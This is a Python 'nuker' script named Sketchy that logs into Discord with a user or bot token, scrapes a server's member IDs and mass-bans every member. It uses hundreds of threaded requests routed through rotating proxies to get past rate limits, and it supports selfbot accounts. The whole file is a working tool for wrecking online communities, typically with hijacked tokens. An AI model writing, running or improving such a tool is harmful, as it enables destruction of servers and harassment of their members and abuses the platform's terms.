f = "\033[0;31m"
w = "\033[37m"

g = "\033[90m"
re = "\033[0m"

try:
    import os
    import time
    import threading
    import discord
    import httpx

    from discord.ext import commands
    from pystyle import System, Center
    from requests_futures.sessions import FuturesSession
    from itertools import cycle

except ImportError as e:
    os.system('cls & mode 80, 20 & title Sketchy - Error')
    print(f"\033[0;31m-> \033[37mmissing requirements\033[0;31m! \033[37m")
    time.sleep(1)
    os.system('pip install -r requirements.txt')
    input();os._exit(0)

os.system('cls & mode 80, 20 & title Sketchy - Login')
token = input(f"\033[0;31m-> \033[37mToken\033[0;31m: \033[37m")
System.Clear()
guild = int(input(f"\033[0;31m-> \033[37mGuild\033[0;31m: \033[37m"))
System.Clear()

def headfilter() -> str:
    if httpx.get("https://discord.com/api/v9/users/@me", headers = {"Authorization": token}).status_code in [200, 201, 204]:
        return "user"
    elif httpx.get("https://discord.com/api/v9/users/@me", headers = {"Authorization": f"Bot {token}"}).status_code in [200, 201, 204]:
        return "bot"
    else:
        print(f"\033[0;31m-> \033[37mInvalid Token\033[0;31m! \033[37m")
        token
        
def rr() -> bool:
    if headfilter() == "user":
        return True
    else:
        return False
        
def hea() -> dict:
    if headfilter() == "user":    
        return {"Authorization": token}
    elif headfilter() == "bot":
        return {"Authorization": f"Bot {token}"}
    else:
        print(f"\033[0;31m-> \033[37mInvalid Token\033[0;31m! \033[37m")
        
headers = hea()

client = commands.Bot(
    command_prefix = "sketchy!",
    self_bot = rr()
)

@client.event
async def on_ready():
    global guildobj
    try:
        guildobj = client.get_guild(guild)
    except:
        print(f"\033[0;31m-> \033[37mInvalid Guild\033[0;31m! \033[37m")
        time.sleep(1)
        System.Clear()
        guild
    await menu()

class sketchy:

    def massban_worker(session, member):
        try:
            proxies = open('assets/proxies.txt').read().split('\n')
            proxy = cycle(proxies)
            api = f"https://discord.com/api/v9/guilds/{guild}/bans/{member}?reason=SketchyW"
            s = session.put(api, headers = headers, proxies = {"http": 'http://' + next(proxy)})
        except KeyboardInterrupt:
            System.Clear()
            os._exit(0)

    async def scrape_request():
        await client.wait_until_ready()
        
        try:
            os.remove("assets/members.txt")
            os.remove("assets/channels.txt")
            os.remove("assets/roles.txt")
        except:
            pass
            
        membercount = 0
        with open("assets/members.txt", "a")as mems:
            for mem in guildobj.members:
                mems.write(str(mem.id) + "\n")
                membercount += 1

async def menu():
    os.system('cls & mode 80, 20 & title Sketchy - Nuker')
    print(f"""

                              {f}╔═╗╦╔═╔═╗╔╦╗╔═╗╦ ╦╦ ╦
                              {g}╚═╗╠╩╗║╣  ║ ║  ╠═╣╚╦╝
                              {w}╚═╝╩ ╩╚═╝ ╩ ╚═╝╩ ╩ ╩ 
                       {f}═══════════════════════════════════{w}
                   {f}═══════════════════════════════════════════{w} 

{f}[{w}?{f}] {w}-> Select An Executable Command Below{f}:
   {f}[{w}!{f}] {w}-> Type 'massban' To Ban-All
   {f}[{w}!{f}] {w}-> Type 'scrape' To Scrape Info
    
    """)

    x = input(f"\033[0;31m-> \033[37mMethod\033[0;31m: \033[37m")

    if x == 'massban':
        members = []
        amount = 0
        session = FuturesSession(max_workers = 350)
        print(f"\033[0;31m-> \033[37mBanning Members\033[0;31m. . .")
        a_file = open('assets/members.txt','r')
        for line in a_file:
            stripped_line = line.strip()
            members.append(stripped_line)
        a_file.close()
        looping = True
        while looping:
            try:
                threading.Thread(target = sketchy.massban_worker, args = (session, members[amount],)).start()
            except:
                looping = False
            amount += 1
            threads = []
        for member in members:
            thread = threading.Thread(target = sketchy.massban_worker, args = (session, member,)).start()
            threads.append(thread)
            thread.start()
        for thread in threads:
            try:
                thread.join()
            except Exception:
                pass
        time.sleep(1.5)
        await menu()

    if x == 'scrape':
        await sketchy.scrape_request()
        print(f"\033[0;31m-> \033[37mScraped Guild Info\033[0;31m! \033[37m")
        time.sleep(1.5)

try:
    if headfilter() == "user":
        client.run(token, bot=False)
    elif headfilter() == "bot":
        client.run(token)
except:
    print(f'\033[0;31m-> \033[37mInvalid Token\033[0;31m! \033[37m')
    time.sleep(1)
    os._exit(0)    